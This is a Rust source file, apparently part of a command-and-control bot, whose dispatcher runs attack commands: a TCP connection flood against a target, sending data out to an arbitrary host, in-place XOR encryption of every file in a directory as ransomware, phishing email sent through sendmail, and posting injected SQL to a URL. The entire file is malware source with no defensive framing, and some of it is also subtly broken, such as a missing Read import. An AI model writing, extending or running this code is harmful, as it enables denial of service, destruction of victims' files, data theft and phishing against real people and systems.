use crate::commands::Command;
use crate::error::C2Error;
use tokio::net::TcpStream;
use tokio::io::{AsyncWriteExt, AsyncReadExt};
use std::process::Command as ShellCommand;
use std::fs;
use std::io::Write;

pub async fn execute_attack(command: &Command) -> Result<(), C2Error> {
    match command.command.as_str() {
        "ddos" => ddos_attack(&command.args).await,
        "exfiltrate" => data_exfiltration(&command.args).await,
        "ransomware" => ransomware_attack(&command.args).await,
        "phishing" => phishing_attack(&command.args).await,
        "sql_injection" => sql_injection_attack(&command.args).await,
        _ => Err(C2Error::CommandError("Unknown command".to_string())),
    }
}

// DDoS attack: floods the target IP and port with TCP connections.
async fn ddos_attack(args: &[String]) -> Result<(), C2Error> {
    if args.len() < 2 {
        return Err(C2Error::CommandError("Missing target IP or port".to_string()));
    }

    let target_ip = &args[0];
    let target_port: u16 = args[1].parse().map_err(|e| C2Error::CommandError(e.to_string()))?;
    
    for _ in 0..1000 {
        let target = target_ip.clone();
        tokio::spawn(async move {
            if let Ok(mut stream) = TcpStream::connect((target.as_str(), target_port)).await {
                let _ = stream.write_all(b"GET / HTTP/1.1\r\n\r\n").await;
            }
        });
    }
    Ok(())
}

// Data Exfiltration: sends data to a target IP and port.
async fn data_exfiltration(args: &[String]) -> Result<(), C2Error> {
    if args.len() < 3 {
        return Err(C2Error::CommandError("Missing target IP, port, or data".to_string()));
    }

    let target_ip = &args[0];
    let target_port: u16 = args[1].parse().map_err(|e| C2Error::CommandError(e.to_string()))?;
    let data = args[2].as_bytes();
    
    let mut stream = TcpStream::connect((target_ip.as_str(), target_port)).await?;
    stream.write_all(data).await?;
    Ok(())
}

// Ransomware Attack: encrypts files in a specified directory.
async fn ransomware_attack(args: &[String]) -> Result<(), C2Error> {
    if args.len() < 2 {
        return Err(C2Error::CommandError("Missing target directory or encryption key".to_string()));
    }

    let target_directory = &args[0];
    let encryption_key = &args[1];

    for entry in fs::read_dir(target_directory)? {
        let entry = entry?;
        let path = entry.path();
        if path.is_file() {
            let mut file = fs::File::open(&path)?;
            let mut content = Vec::new();
            file.read_to_end(&mut content)?;

            let encrypted_content: Vec<u8> = content.iter().zip(encryption_key.bytes().cycle())
                .map(|(a, b)| a ^ b).collect();

            let mut encrypted_file = fs::File::create(&path)?;
            encrypted_file.write_all(&encrypted_content)?;
        }
    }
    Ok(())
}

// Phishing Attack: sends a phishing email.
async fn phishing_attack(args: &[String]) -> Result<(), C2Error> {
    if args.len() < 2 {
        return Err(C2Error::CommandError("Missing target email or email content".to_string()));
    }

    let target_email = &args[0];
    let email_content = &args[1];

    let sendmail_path = "/usr/sbin/sendmail";
    let output = ShellCommand::new(sendmail_path)
        .arg(target_email)
        .output()
        .expect("Failed to execute sendmail command");

    if output.status.success() {
        let mut mail = fs::File::create("/tmp/phishing_email.txt")?;
        write!(mail, "Subject: Urgent Update Required\n\n{}", email_content)?;
        ShellCommand::new(sendmail_path)
            .arg("-t")
            .stdin(fs::File::open("/tmp/phishing_email.txt")?)
            .output()
            .expect("Failed to send phishing email");
    } else {
        return Err(C2Error::CommandError("Failed to execute sendmail".to_string()));
    }

    Ok(())
}

// SQL Injection Attack: executes a malicious SQL query on the target.
async fn sql_injection_attack(args: &[String]) -> Result<(), C2Error> {
    if args.len() < 2 {
        return Err(C2Error::CommandError("Missing target URL or malicious query".to_string()));
    }

    let target_url = &args[0];
    let malicious_query = &args[1];
    
    let client = reqwest::Client::new();
    let res = client.post(target_url)
        .body(malicious_query.clone())
        .send()
        .await?;
    
    if res.status().is_success() {
        println!("SQL injection successful: {}", res.text().await?);
    } else {
        return Err(C2Error::CommandError("SQL injection failed".to_string()));
    }

    Ok(())
}
